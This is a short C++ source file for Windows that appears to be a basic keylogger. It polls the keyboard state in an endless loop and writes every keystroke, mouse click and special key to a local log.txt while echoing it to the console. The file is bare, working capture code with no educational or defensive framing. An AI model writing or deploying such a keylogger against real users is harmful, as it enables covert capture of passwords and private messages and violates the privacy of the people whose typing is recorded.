#include <iostream>
#include<windows.h>
#include<fstream>
#include<ctime>
#include<unistd.h>

using namespace std;

void log(int key)
{
	ofstream logfile;
	logfile.open("log.txt",fstream::app);

	switch(key)
	{
		case VK_LBUTTON:
			logfile << "[LeftClick]";
			cout << "[LeftClick]";
			break;

		case VK_RBUTTON:
			logfile << "[RightClick]";
			cout << "[RightClick]";
			break;

		case VK_MBUTTON:
			logfile << "[MiddleClick]";
			cout << "[MiddleClick]";
			break;

		case VK_SHIFT:
			logfile << "[Shift]";
			cout << "[Shift]";
			break;

		case VK_UP:
			logfile << "[Up]";
			cout << "[Up]";
			break;

		case VK_DOWN:
			logfile << "[Down]";
			cout << "[Down]";
			break;

		case VK_LEFT:
			logfile << "[Left]";
			cout << "[Left]";
			break;

		case VK_RIGHT:
			logfile << "[Right]";
			cout << "[Right]";
			break;

		case VK_TAB:
			logfile << "[Tab]";
			cout << "[Tab]";
			break;

		case VK_CONTROL:
			logfile << "[Ctrl]";
			cout << "[Ctrl]";
			break;

		case VK_BACK:
			logfile << "[BackSpace]";
			cout << "[BackSpace]";
			break;

		case VK_MENU:
			logfile << "[Alt]";
			cout << "[Alt]";
			break;

		case VK_RETURN:
			logfile << "[Enter]";
			cout << "[Enter]";
			break;

		case VK_CAPITAL:
			logfile << "[CapsLock]";
			cout << "[CapsLock]";
			break;

		case VK_ESCAPE:
			logfile << "[Esc]";
			cout << "[Esc]";
			break;

		case VK_SPACE:
			logfile << "[Space]";
			cout << "[Space]";
			break;

		default:
			logfile << (char)key;
			cout << (char)key;

	}
	logfile.close();
}

int main()
{
	int i;
	while(true)
	{
		for(i = 8;i < 256;i++)
		{
			//usleep(1);
			if(GetAsyncKeyState(i) == -32767)
				log(i);
		}
	}
	return(0);
}
